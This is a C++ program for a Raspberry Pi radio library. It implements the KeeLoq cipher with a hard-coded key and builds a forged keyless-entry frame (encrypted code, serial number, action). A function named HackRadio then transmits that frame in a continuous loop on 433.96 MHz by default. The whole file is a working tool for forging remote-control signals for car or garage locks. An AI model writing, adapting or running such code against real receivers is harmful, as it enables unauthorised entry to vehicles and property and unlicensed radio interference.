#include <unistd.h>
#include "src/librpitx.h"
#include <unistd.h>
#include "stdio.h"
#include <cstring>
#include <signal.h>

bool running=true;

static void
terminate(int num)
{
	running=false;
	fprintf(stderr,"Caught signal %d - Terminating\n", num);
}


#define KeeLoq_NLF 0x3a5c742e

#define bit(x,n)    (((x)>>(n))&1)
#define g5(x,a,b,c,d,e) (bit(x,a)+bit(x,b)*2+bit(x,c)*4+bit(x,d)*8+bit(x,e)*16)
uint32_t KeeLoq_Encrypt (const uint32_t data, const uint64_t key)
{
	uint32_t x = data, r;
	for (r = 0; r < 528; r++)
	{
		x = (x >> 1) ^ ((bit(x, 0)^bit(x, 16) ^ (uint32_t)bit(key, r & 63)^bit(KeeLoq_NLF, g5(x, 1, 9, 20, 26, 31))) << 31);
	}
	return x;
}

uint32_t write_bits(float data[], uint32_t n, uint32_t v)
{
	uint32_t len = 0;
	for (unsigned int i=0; i < n; ++i)
	{
		unsigned int b = v & (1 << i);
		for (int j=0; j < (b ? 15 : 16); j++)
			data[len++] = 0;
		for (int j=0; j < (b ? 16 : 15); j++)
			data[len++] = 1;
	}
	return len;
}

void HackRadio(uint64_t Freq, uint32_t key, uint32_t sn, uint8_t action)
{
	float data[60 + 12 * 31 + 32 * 31 + 28 * 31 + 4 * 31 + 2 * 31];
	int len = 0;

	// Sync
	for (int j=0; j < 60; j++)
		data[len++] = 1.0;

	// Pre-amble
	len += write_bits(data + len, 12, 0);

	// key, sn, action
	len += write_bits(data + len, 32, key);
	len += write_bits(data + len, 28, sn);
	len += write_bits(data + len, 4, action);

	// Post-amble 
	len += write_bits(data + len, 2, 0);

	int FifoSize=512;
	amdmasync amtest(Freq, 4000, 14, FifoSize);

	int p = 0;
	while(running)
	{
		usleep(100);
		int Available=amtest.GetBufferAvailable();
		if (Available > FifoSize / 2)
		{
			int Index=amtest.GetUserMemIndex();
			for (int i=0; i < Available; ++i)
			{
				amtest.SetAmSample(Index + i, data[p]);
				p = (p + 1) % len;
			}
		}
	}
	amtest.stop();
}

int main(int argc, char* argv[])
{
	
	uint64_t Freq=433960000;
	if(argc>1)
		 Freq=atoll(argv[1]);

	uint32_t key = KeeLoq_Encrypt(0xb3da0000, 0x7D093B66B31C376A);
	uint32_t sn = 0x1337bae;
	uint8_t action = 0;

	for (int i = 0; i < 64; i++) {
		if (i == 11)
			continue;
	        struct sigaction sa;
	        std::memset(&sa, 0, sizeof(sa));
	        sa.sa_handler = terminate;
	        sigaction(i, &sa, NULL);
	}

	HackRadio(Freq, key, sn, action);
}	

